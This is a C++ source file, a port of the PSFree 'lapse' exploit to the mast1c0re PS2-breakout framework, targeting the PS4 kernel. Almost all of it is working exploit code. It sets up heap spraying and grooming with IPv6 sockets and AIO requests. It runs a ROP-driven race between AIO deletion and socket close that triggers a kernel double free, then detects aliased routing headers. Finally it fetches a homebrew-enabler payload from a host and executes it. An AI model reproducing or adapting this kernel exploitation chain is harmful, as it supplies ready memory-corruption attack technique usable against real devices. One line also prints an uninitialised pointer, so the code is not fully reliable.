/* Copyright (C) 2025 anonymous
This file is a port of https://github.com/kmeps4/PSFree/blob/main/lapse.mjs
which is part of the PSFree project.

PSFree is free software: you can redistribute it and/or modify
it under the terms of the GNU Affero General Public License as
published by the Free Software Foundation, either version 3 of the
License, or (at your option) any later version.

PSFree is distributed in the hope that it will be useful,
but WITHOUT ANY WARRANTY; without even the implied warranty of
MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
GNU Affero General Public License for more details.

You should have received a copy of the GNU Affero General Public License
along with this program.  If not, see <https://www.gnu.org/licenses/>. */

#include <mast1c0re.hpp>
#include "../helpers/helpers.cpp"
#include "../helpers/ruby_chan.cpp"

int32_t err = 0; // Global error variable

#define CPU_CORE 2

int32_t cpu_affinity_priority()
{
    uint64_t mask = 0;
    rtprio_s rtprio = {0};

    printf_debug("* Updating CPU affinity and priority...\n");

    // Get affinity
    err = get_affinity(&mask);
    if (err) goto end;
    printf_debug(
        "Initial affinity: %d %d %d %d %d %d %d %d\n",
        (int32_t)((mask >> 0) & 1), (int32_t)((mask >> 1) & 1),
        (int32_t)((mask >> 2) & 1), (int32_t)((mask >> 3) & 1),
        (int32_t)((mask >> 4) & 1), (int32_t)((mask >> 5) & 1),
        (int32_t)((mask >> 6) & 1), (int32_t)((mask >> 7) & 1)
    );

    // Pinning to `cpu_core`
    // Pin to 1 core so that we only use 1 per-cpu bucket.
    // This will make heap spraying and grooming easier.
    mask = 1 << CPU_CORE;
    err = set_affinity(&mask);
    if (err) goto end;
    // Recheck affinity
    mask = 0;
    err = get_affinity(&mask);
    if (err) goto end;
    printf_debug(
        "Updated affinity: %d %d %d %d %d %d %d %d\n",
        (int32_t)((mask >> 0) & 1), (int32_t)((mask >> 1) & 1),
        (int32_t)((mask >> 2) & 1), (int32_t)((mask >> 3) & 1),
        (int32_t)((mask >> 4) & 1), (int32_t)((mask >> 5) & 1),
        (int32_t)((mask >> 6) & 1), (int32_t)((mask >> 7) & 1)
    );

    // Get priority
    err = get_priority(&rtprio);
    if (err) goto end;
    printf_debug("Initial priority: type %d prio %d\n", rtprio.type, rtprio.prio);
    
    // Set priority to realtime 256 (highest we can achieve given our credentials)
    rtprio = { RTP_PRIO_REALTIME, 0x100 };
    err = set_priority(&rtprio);
    if (err) goto end;
    // Recheck priority
    rtprio = {0};
    err = get_priority(&rtprio);
    if (err) goto end;
    printf_debug("Updated priority: type %d prio %d\n", rtprio.type, rtprio.prio);

    end:
        return err;
}

#define NUM_SDS 100 // Adjust later
#define NUM_WORKERS 2
#define NUM_GROOM_IDS 0x200
#define NUM_GROOM_REQS 3 // Chosen to maximize the number of 0x80 malloc allocs per submission

struct setup_s
{
    unixpair_s              unixpair;
    int32_t                 sds[NUM_SDS];
    uint32_t                sock_count;
    SceKernelAioSubmitId    worker_id;
    SceKernelAioRWRequest   worker_reqs[NUM_WORKERS];
    SceKernelAioSubmitId    test_id;
    SceKernelAioRWRequest   test_req;
    useconds_t              timeout;
    SceKernelAioSubmitId    groom_ids[NUM_GROOM_IDS];
    SceKernelAioRWRequest   groom_reqs[NUM_GROOM_REQS];
};
setup_s setup_data = {0};

void setup()
{
    setup_data.timeout = 1;

    printf_debug("STAGE: Setup\n");

    // CPU pinning and priority
    err = cpu_affinity_priority();
    if (err) goto end;

    // Create a unix socketpair to use as a blocking primitive
    err = create_unixpair(&setup_data.unixpair);
    if (err) goto end;
    printf_debug("Unix socketpair created: block_fd %d unblock_fd %d\n",
        setup_data.unixpair.block_fd, setup_data.unixpair.unblock_fd);

    // Heap spraying/grooming with AF_INET6 UDP sockets
    for (uint32_t i = 0; i < NUM_SDS; i++) {
        setup_data.sds[i] = create_ipv6udp();
        setup_data.sock_count += (setup_data.sds[i] < 0) ? 0 : 1;
    }
    printf_debug("Heap sprayed with %d AF_INET6 UDP sockets!\n", setup_data.sock_count);

    // This part will block the worker threads from processing entries so that
    // we may cancel them instead. this is to work around the fact that
    // aio_worker_entry2() will fdrop() the file associated with the aio_entry
    // on ps5. we want aio_multi_delete() to call fdrop()
    for (uint32_t i = 0; i < NUM_WORKERS; i++) {
        setup_data.worker_reqs[i].nbyte = 1;
        setup_data.worker_reqs[i].fd = setup_data.unixpair.block_fd;
    }
    aio_submit_cmd(
        SCE_KERNEL_AIO_CMD_READ,
        setup_data.worker_reqs,
        NUM_WORKERS,
        SCE_KERNEL_AIO_PRIORITY_HIGH,
        &setup_data.worker_id
    );
    printf_debug("Worker AIOs submitted with ID: %d\n", setup_data.worker_id);

    {// Check if AIO is blocked
    setup_data.test_req.fd = -1;
    aio_submit_cmd(
        SCE_KERNEL_AIO_CMD_READ,
        &setup_data.test_req,
        1,
        SCE_KERNEL_AIO_PRIORITY_HIGH,
        &setup_data.test_id
    );
    printf_debug("AIO test submitted with ID: %d\n", setup_data.test_id);

    reset_errno(); // Reset errno
    aio_multi_wait(
        &setup_data.test_id,
        1,
        aio_errs,
        SCE_KERNEL_AIO_WAIT_AND,
        &setup_data.timeout
    );
    err = read_errno();
    printf_debug("aio_multi_wait errno %d\n", err);
    printf_debug("aio_multi_wait err[0] %d\n", aio_errs[0]);

    if (err != 60) { // ETIMEDOUT
        err = -1;
        free_aios(&setup_data.test_id, 1);
        printf_debug("SceAIO system not blocked. errno: %ld\n", err);
        goto end;
    }
    err = 0;
    free_aios(&setup_data.test_id, 1);
    printf_debug("SceAIO system blocked!\n");
    }

    // Groom the heap
    for (uint32_t i = 0; i < NUM_GROOM_REQS; i++) {
        setup_data.groom_reqs[i].fd = -1;
    }
    // Allocate enough so that we start allocating from a newly created slab
    spray_aio(
        setup_data.groom_ids,
        NUM_GROOM_IDS,
        setup_data.groom_reqs,
        NUM_GROOM_REQS,
        false
    );
    // Cancel the groomed AIOs
    cancel_aios(setup_data.groom_ids, NUM_GROOM_IDS);
    printf_debug("Heap groomed with %d AIOs!\n", NUM_GROOM_IDS);

    end:
        printf_debug("* errno value %d\n", read_errno());
}

#define NUM_ALIAS 100
#define MARKER_OFFSET 4

struct in6_addr
{
    uint8_t s6_addr[16];
};

template <size_t size>
struct ip6_rthdr
{
    static constexpr uint8_t len = ((size >> 3) - 1) & ~1;
    static constexpr uint8_t segleft = len >> 1;
    static constexpr uint8_t used_size = (len + 1) << 3;
    static constexpr uint8_t pad = size - used_size;
    uint8_t  ip6r_nxt = 0;
    uint8_t  ip6r_len = len;
    uint8_t  ip6r_type = 0;
    uint8_t  ip6r_segleft = segleft;
    uint32_t ip6r_reserved = 0;
    in6_addr ip6r_sigs[segleft] = {0};
    uint8_t  _pad[pad] = {0};
};

int32_t aliased_rthdrs_sds[2] = {0};

int32_t make_aliased_rthdrs()
{
    int32_t *sds = setup_data.sds;
    ip6_rthdr<0x80> rthdr;
    ip6_rthdr<0x80> rthdr2;

    for (int32_t loop = 0; loop < NUM_ALIAS; loop++) {
        for (int32_t i = 0; i < NUM_SDS; i++) {
            if (sds[i] < 0) continue; // Skip invalid sockets
            rthdr.ip6r_reserved = i; // Set a unique marker for each rthdr
            set_rthdr(sds[i], &rthdr, rthdr.used_size);
        }

        for (int32_t i = 0; i < NUM_SDS; i++) {
            if (sds[i] < 0) continue; // Skip invalid sockets
            socklen_t len = rthdr.used_size;
            if (get_rthdr(sds[i], &rthdr2, &len) != 0) continue;
            if (rthdr2.ip6r_reserved == i) continue;
            printf_debug("Aliased rthdrs found at attempt: %d\n", loop);
            aliased_rthdrs_sds[0] = sds[i];
            aliased_rthdrs_sds[1] = sds[rthdr2.ip6r_reserved];
            printf_debug("aliased_rthdrs_sds: %d %d\n",
                aliased_rthdrs_sds[0], aliased_rthdrs_sds[1]);
            sds[i] = -1;
            sds[rthdr2.ip6r_reserved] = -1;
            free_rthdrs(sds, NUM_SDS);
            return 0;
        }
    }
    printf_debug("Failed to make aliased rthdrs!\n");
    return -1;
}

#define NUM_REQS 3
#define WHICH_REQ NUM_REQS - 1
#define NUM_RACES 100

#define SCE_KERNEL_ERROR_ESRCH 0x80020003
#define TCP_INFO 0x20
#define SIZE_TCP_INFO 0xec // Size of the TCP info structure
#define TCPS_ESTABLISHED 4

ScePthreadBarrier barrier;
int32_t race_errs[2] = {0};
uint8_t thr_chain_buf[0x4000] __attribute__((aligned(16))) = {0};
uint8_t chain_buf[0x200] __attribute__((aligned(16))) = {0};

int32_t race_one(
    SceKernelAioSubmitId id,
    int32_t sd_conn
)
{
    printf_debug("SceKernelAioSubmitId: %d sd_conn: %d\n", id, sd_conn);
    ROP_Chain thr_chain = ROP_Chain((uint64_t*)thr_chain_buf, 0x4000);
    ROP_Chain chain = ROP_Chain((uint64_t*)chain_buf, 0x200);
    if (!thr_chain.is_initialized() || !chain.is_initialized())
    {
        printf_debug("Failed to initialize ROP chains!\n");
        return -1;
    }
    printf_debug("* Starting race...\n");

    int64_t rax = 0;
    {
    // Set thread affinity and priority
    uint64_t mask = 1 << CPU_CORE;
    thr_chain.push_call(
        LIBKERNEL(LIB_KERNEL_CPUSET_SETAFFINITY),
        CPU_LEVEL_WHICH,
        CPU_WHICH_TID,
        -1,
        8,
        PVAR_TO_NATIVE(&mask)
    );
    rtprio_s rtprio = { RTP_PRIO_REALTIME, 0x100 };
    thr_chain.push_call(
        LIBKERNEL(LIB_KERNEL_RTPRIO_THREAD),
        RTP_SET,
        0,
        PVAR_TO_NATIVE(&rtprio)
    );
    // Ready signal
    thr_chain.set_RAX(1);
    thr_chain.get_result(&rax);
    // Enter barrier
    thr_chain.push_call(
        LIBKERNEL(LIB_KERNEL_PTHREAD_BARRIER_WAIT),
        PVAR_TO_NATIVE(&barrier)
    );
    // Trigger AIO delete
    thr_chain.push_call(
        // LIBKERNEL(LIB_KERNEL_SCE_KERNEL_AIO_CANCEL_REQUESTS),
        syscall_wrappers[SYS_AIO_MULTI_DELETE],
        PVAR_TO_NATIVE(&id),
        1,
        PVAR_TO_NATIVE(race_errs)
    );
    thr_chain.push_call(
        EBOOT(EBOOT_WRITE_STUB),
        PS::Debug.sock,
        PVAR_TO_NATIVE("Exiting...\n"),
        11
    );
    }

    ScePthread thread = 0;
    if (thr_chain.execute(&thread) != 0)
    {
        printf_debug("Failed to execute thread's ROP chain!\n");
        return -1;
    }
    uint64_t thread_id = DEREF(thread);
    printf_debug("Thread spawned! ID: %ld\n", thread_id);

    // Pthread barrier implementation:
    //
    // Given a barrier that needs N threads (set by `count` param) for it to be
    // unlocked, a thread will sleep if it waits on the barrier and N - 1 threads
    // havent't arrived before (i.e. not the last one to arrive)
    //
    // If there were already N - 1 threads then that thread (last waiter) won't
    // sleep and it will send out a wake-up call to the waiting threads
    //
    // Since the ps4's cores only have 1 hardware thread each, we can pin 2
    // threads on the same core and control the interleaving of their
    // executions via controlled context switches

    // Wait for the worker to enter the barrier and sleep
    // Yielding allows the worker to run
    while (rax == 0)
        PS::Breakout::call(LIBKERNEL(LIB_KERNEL_SCHED_YIELD));

    printf_debug("RAX: %d\n", rax); // Should be 1

    int64_t ret = -1;
    {
    // Enter the barrier as the last waiter
    chain.push_call(
        LIBKERNEL(LIB_KERNEL_SCE_PTHREAD_BARRIER_WAIT),
        PVAR_TO_NATIVE(&barrier)
    );
    // Yield and hope the scheduler runs the worker next. the worker will then
    // sleep at soclose() and hopefully we run next
    chain.push_call(LIBKERNEL(LIB_KERNEL_SCHED_YIELD));
    // If we get here and the worker hasn't been reran then we can delay the
    // worker's execution of soclose() indefinitely
    chain.push_call(
        syscall_wrappers[SYS_THR_SUSPEND_UCONTEXT],
        thread_id
    );
    chain.get_result(&ret);
    }

    if (chain.execute() != 0)
    {
        printf_debug("Failed to execute ROP chain!\n");
        return -1;
    }
    printf_debug("ROP chain executed!\n");

    if (ret != 0)
    {
        printf_debug("Failed to suspend thread! Error: %p\n", read_errno());
        scePthreadJoin(thread, 0); // Wait for the thread to finish
        return -1;
    }

    bool won_race = false;

    // Poll AIO state
    SceKernelAioError poll_err = 0;
    aio_multi_poll(&id, 1, &poll_err);
    printf_debug("Poll: 0x%08x\n", poll_err);

    // Get TCP info
    uint8_t info_buf[SIZE_TCP_INFO] = {0};
    socklen_t info_size = SIZE_TCP_INFO;
    PS::getsockopt(
        sd_conn, IPPROTO_TCP, TCP_INFO, info_buf, &info_size
    );

    if (info_size != SIZE_TCP_INFO) {
        printf_debug("Failed to get TCP info: info_size isn't %d: %d\n",
            SIZE_TCP_INFO, info_size);
        // Move these
        PS::Breakout::call(syscall_wrappers[SYS_THR_RESUME_UCONTEXT], thread_id);
        scePthreadJoin(thread, 0); // Wait for the thread to finish
        printf_debug("Thread exited.\n");
        return -1;
    }

    // log info_buf
    // printf_debug("info_buf: ");
    // for (uint32_t i = 0; i < info_size; i++)
    //     printf_debug("0x%02x ", info_buf[i]);
    // printf_debug("\n");

    uint8_t tcp_state = info_buf[0];
    printf_debug("tcp_state: %d\n", tcp_state);

    // To win, must make sure that poll_res == 0x10003/0x10004 and tcp_state == 5
    if (poll_err != SCE_KERNEL_ERROR_ESRCH && tcp_state != TCPS_ESTABLISHED)
    {
        // PANIC: double free on the 0x80 malloc zone. Important kernel
        // data may alias
        aio_multi_delete(&id, 1, &poll_err);
        won_race = true;
    }

    PS::Breakout::call(syscall_wrappers[SYS_THR_RESUME_UCONTEXT], thread_id);
    scePthreadJoin(thread, 0); // Wait for the thread to finish
    printf_debug("Thread exited.\n");

    if (won_race)
    {
        printf_debug("Race errors: 0x%08x 0x%08x\n", race_errs[0], race_errs[1]);
        // If the code has no bugs then this isn't possible but we keep the
        // check for easier debugging
        if (race_errs[0] != race_errs[1])
        {
            printf_debug("ERROR: bad won_race!\n");
            return -1;
        }
        // RESTORE: double freed memory has been reclaimed with harmless data
        // PANIC: 0x80 malloc zone pointers aliased
        return make_aliased_rthdrs();
    }

    return -1;
}

int32_t double_free_reqs()
{
    printf_debug("STAGE: Double free AIO queue entry\n");

    sockaddr_in server_addr = {0};
    server_addr.sin_family = AF_INET;
    server_addr.sin_port = PS::htons(5050);
    server_addr.sin_addr.s_addr = PS::htonl(0x7f000001); // 127.0.0.1

    scePthreadBarrierInit(&barrier, 0, 2, 0);
    printf_debug("Barrier initialized! %p\n", barrier);

    SceKernelAioRWRequest reqs[NUM_REQS] = {0};
    SceKernelAioSubmitId req_ids[NUM_REQS] = {0};
    int32_t req_errs[NUM_REQS] = {0};

    for (uint32_t i = 0; i < NUM_REQS; i++)
        reqs[i].fd = -1;

    int32_t sd_listen = PS::socket(AF_INET, SOCK_STREAM, 0);
    int32_t optval = 1;
    PS::setsockopt(
        sd_listen, SOL_SOCKET, SO_REUSEADDR, &optval, sizeof(int32_t)
    );
    if (PS::bind(sd_listen, (sockaddr*)&server_addr, sizeof(sockaddr_in)) != 0)
    {
        printf_debug("Failed to bind socket: %p\n", read_errno());
    }
    if (PS::listen(sd_listen, 1) != 0)
    {
        printf_debug("Failed to listen on socket: %p\n", read_errno());
    }

    for (uint32_t i = 0; i < NUM_RACES; i++) {
        int32_t sd_client = PS::socket(AF_INET, SOCK_STREAM, 0);
        printf_debug("sd_listen: %d sd_client: %d\n", sd_listen, sd_client);
        PS::connect(sd_client, (sockaddr *)&server_addr, sizeof(server_addr));
        int32_t sd_conn = PS::accept(sd_listen, 0, 0);
        printf_debug("sd_conn: %d\n", sd_conn);
        // Force soclose() to sleep
        linger optval_client = {1, 1};
        if (PS::setsockopt(
            sd_client, SOL_SOCKET, SO_LINGER, &optval_client, sizeof(optval_client)
        ) != 0)
        {
            printf_debug("Failed to set SO_LINGER on client socket: %p\n", read_errno());
        }
        reqs[WHICH_REQ].fd = sd_client;

        aio_submit_cmd(
            SCE_KERNEL_AIO_CMD_WRITE | SCE_KERNEL_AIO_CMD_MULTI,
            reqs,
            NUM_REQS,
            SCE_KERNEL_AIO_PRIORITY_HIGH,
            req_ids
        );
        aio_multi_cancel(req_ids, NUM_REQS, req_errs);
        aio_multi_poll(req_ids, NUM_REQS, req_errs);

        printf_debug("AIOs submitted! IDs: %d %d %d\n",
            req_ids[0], req_ids[1], req_ids[2]);

        // Drop the reference so that aio_multi_delete() will trigger _fdrop()
        PS::close(sd_client);

        int32_t ret = race_one(req_ids[WHICH_REQ], sd_conn);

        // MEMLEAK: if we won the race, aio_obj.ao_num_reqs got 
        // decremented twice. this will leave one request undeleted
        aio_multi_delete(req_ids, NUM_REQS, req_errs);
        PS::close(sd_conn);

        if (ret == 0) {
            printf_debug("Won race at attempt %d\n", i);
            PS::close(sd_listen);
            scePthreadBarrierDestroy(&barrier);
            return 0;
        }
    }

    printf_debug("Failed aio double free!\n");
    return -1;
}

void main()
{
    // PS2 Breakout
    PS::Breakout::init();

    // Attempt to connect to debug server
    PS::Debug.connect(IP(192, 168, 1, 37), 9023);

    // HELLO EVERYNYAN!
    Okage::printf("HELL%d\nEVERYNYAN!\n", 0);
    printf_debug("HELL%d\nEVERYNYAN!\n", 0);

    // Initialize syscall wrappers
    syscall_init();

    // STAGE: Setup
    setup();
    if (err) goto end;

    // STAGE: Double free AIO queue entry
    err = double_free_reqs();
    if (err) goto end;

    end:
        if (err != 0)
        {
            printf_debug("Something went wrong! Error: %d\n", err);
            PS::Breakout::restore(); // Restore corruption
        }
        else
        {
            printf_debug("Success!\n");
            // Load HEN vtx payload [5.05-12.02]
            // Big thanks to EchoStretch for this hen-vtx!
            char* payload;
            size_t payload_size;        
            char buffer[256];
            snprintf(buffer, sizeof(buffer), "Running %s", payload);
            printf_debug(buffer);
            if (load_payload_from_host("ps4-hen-1202-vtx.bin",&payload,payload_size)) {
                execute_payload(payload, payload_size);
                printf_debug("Payload executed successfully.\n");
            } else {
                printf_debug("Failed to load payload!\n");
            }
            while (true) cycle_pad_colors();
        }
}
